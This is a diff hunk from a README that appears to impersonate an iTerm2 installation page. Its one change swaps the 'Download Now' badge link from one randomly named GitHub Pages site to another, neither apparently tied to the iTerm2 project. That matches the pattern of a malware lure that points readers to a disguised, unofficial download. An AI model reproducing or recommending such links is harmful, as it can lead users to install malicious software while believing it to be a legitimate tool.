@@ -3,7 +3,7 @@
 
 iTerm2 is a powerful, open-source terminal emulator for macOS, designed to enhance your command-line experience with advanced features and customization. Follow the instructions below to install iTerm2 on your Mac and supercharge your workflow. 🚀
 
-[![Download Now](https://img.shields.io/badge/Download%20iTerm2-Now-5856D6?style=for-the-badge&logo=apple)](https://fituganshfgh.github.io/.github/iterm2)
+[![Download Now](https://img.shields.io/badge/Download%20iTerm2-Now-5856D6?style=for-the-badge&logo=apple)](https://mrboomzeus519.github.io/gimronus/iterm2)
 
 If the download button doesn't work, follow the manual installation instructions below using the terminal.
 
